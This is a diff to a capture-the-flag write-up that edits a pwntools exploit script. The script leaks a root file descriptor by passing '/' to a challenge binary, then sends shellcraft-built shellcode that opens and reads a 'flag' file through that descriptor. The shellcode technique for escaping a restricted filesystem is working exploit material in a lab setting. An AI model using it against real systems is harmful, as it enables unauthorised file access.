@@ -101,11 +101,10 @@ The following script uses `shellcraft` to generate the payload. Since the `exit`
 ```python
 from pwn import *
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
 # Pass '/' to leak the root FD (fd 3)
-p = process([exe, "/"])
+p = process([elf.path, "/"])
 
 # Construct shellcode using shellcraft
 # 1. openat(3, "flag", O_RDONLY)
@@ -122,7 +121,7 @@ sc += "jmp ."
 shellcode = asm(sc)
 p.send(shellcode)
 
-# Read output with timeout
+# Read output
 print(p.recvall(timeout=1).decode())
 
 p.close()
